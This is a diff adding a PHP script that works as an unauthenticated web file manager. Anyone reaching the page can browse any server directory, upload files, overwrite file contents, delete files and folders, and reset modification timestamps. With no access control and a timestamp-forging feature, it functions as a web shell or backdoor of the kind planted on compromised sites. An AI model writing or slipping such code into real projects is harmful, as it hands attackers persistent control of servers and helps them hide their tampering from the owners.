@@ -1,0 +1,118 @@
+
+
+$directory = isset($_GET['dir']) ? $_GET['dir'] : './';
+$directory = realpath($directory);
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
+    $target_file = $directory . '/' . basename($_FILES['fileToUpload']['name']);
+    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
+        echo "The file " . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . " has been uploaded successfully.<br>";
+    } else {
+        echo "Sorry, there was an error uploading your file.<br>";
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['fileContent']) && isset($_POST['fileName'])) {
+    $file_to_edit = $directory . '/' . basename($_POST['fileName']);
+    file_put_contents($file_to_edit, $_POST['fileContent']);
+    echo "The file " . htmlspecialchars(basename($_POST['fileName'])) . " has been edited successfully.<br>";
+}
+
+if (isset($_GET['delete'])) {
+    $item_to_delete = $directory . '/' . basename($_GET['delete']);
+    if (is_file($item_to_delete)) {
+        unlink($item_to_delete);
+        echo "The file " . htmlspecialchars(basename($_GET['delete'])) . " has been deleted.<br>";
+    } elseif (is_dir($item_to_delete)) {
+        if (rmdir($item_to_delete)) {
+            echo "The directory " . htmlspecialchars(basename($_GET['delete'])) . " has been deleted.<br>";
+        } else {
+            echo "The directory could not be deleted. Make sure it is empty.<br>";
+        }
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['updateTime']) && isset($_POST['itemToUpdate'])) {
+    $item_to_update = $directory . '/' . basename($_POST['itemToUpdate']);
+    $new_time = strtotime($_POST['updateTime']);
+    if ($new_time !== false) {
+        touch($item_to_update, $new_time);
+        echo "The item " . htmlspecialchars(basename($_POST['itemToUpdate'])) . " has been updated to " . date('Y-m-d H:i:s', $new_time) . ".<br>";
+    } else {
+        echo "Invalid date and time format. Please enter a valid date and time.<br>";
+    }
+}
+
+$files = scandir($directory);
+echo "<h2>Files and Directories in: " . htmlspecialchars($directory) . "</h2>";
+echo "<table border='1' cellpadding='10' cellspacing='0'>";
+echo "<tr><th>Name</th><th>Type</th><th>Last Modified</th><th>Actions</th></tr>";
+
+foreach ($files as $file) {
+    if ($file != ".") {
+        $full_path = realpath($directory . '/' . $file);
+        $modTime = date('Y-m-d H:i:s', filemtime($full_path));
+        if (is_dir($full_path)) {
+            echo "<tr>
+                    <td><a href=\"?dir=" . urlencode($full_path) . "\">[DIR] " . htmlspecialchars($file) . "</a></td>
+                    <td>Directory</td>
+                    <td>$modTime</td>
+                    <td>
+                        <a href=\"?dir=" . urlencode($directory) . "&delete=" . urlencode($file) . "\" onclick=\"return confirm('Are you sure you want to delete this directory?');\">[Delete]</a> 
+                        <a href=\"?dir=" . urlencode($directory) . "&update=" . urlencode($file) . "\">[Update Modified Time]</a>
+                    </td>
+                  </tr>";
+        } elseif (is_file($full_path)) {
+            echo "<tr>
+                    <td>" . htmlspecialchars($file) . "</td>
+                    <td>File</td>
+                    <td>$modTime</td>
+                    <td>
+                        <a href=\"?dir=" . urlencode($directory) . "&edit=" . urlencode($file) . "\">[Edit]</a> 
+                        <a href=\"?dir=" . urlencode($directory) . "&delete=" . urlencode($file) . "\" onclick=\"return confirm('Are you sure you want to delete this file?');\">[Delete]</a> 
+                        <a href=\"?dir=" . urlencode($directory) . "&update=" . urlencode($file) . "\">[Update Modified Time]</a>
+                    </td>
+                  </tr>";
+        }
+    }
+}
+echo "</table>";
+
+$parent_directory = dirname($directory);
+if ($directory != realpath('./')) {
+    echo "<br><a href=\"?dir=" . urlencode($parent_directory) . "\">Go Back</a><br><br>";
+}
+
+echo "<h2>Upload a File</h2>
+<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+    Select file to upload:
+    <input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\">
+    <input type=\"submit\" value=\"Upload File\" name=\"submit\">
+</form>";
+
+if (isset($_GET['update'])) {
+    $item_to_update = realpath($directory . '/' . $_GET['update']);
+    if (is_file($item_to_update) || is_dir($item_to_update)) {
+        echo "<h2>Update Modification Time: " . htmlspecialchars($_GET['update']) . "</h2>";
+        echo "<form action=\"\" method=\"post\">
+                <label for=\"updateTime\">Enter new date and time (format: YYYY-MM-DD HH:MM:SS):</label><br>
+                <input type=\"text\" name=\"updateTime\" placeholder=\"2023-04-03 14:30:00\"><br>
+                <input type=\"hidden\" name=\"itemToUpdate\" value=\"" . htmlspecialchars($_GET['update']) . "\">
+                <input type=\"submit\" value=\"Update Time\">
+              </form>";
+    }
+}
+
+if (isset($_GET['edit'])) {
+    $file_to_edit = realpath($directory . '/' . $_GET['edit']);
+    if (is_file($file_to_edit)) {
+        $file_content = file_get_contents($file_to_edit);
+        echo "<h2>Edit File: " . htmlspecialchars($_GET['edit']) . "</h2>";
+        echo "<form action=\"\" method=\"post\">
+                <textarea name=\"fileContent\" rows=\"10\" cols=\"80\">" . htmlspecialchars($file_content) . "</textarea><br>
+                <input type=\"hidden\" name=\"fileName\" value=\"" . htmlspecialchars($_GET['edit']) . "\">
+                <input type=\"submit\" value=\"Save Changes\">
+              </form>";
+    }
+}
+
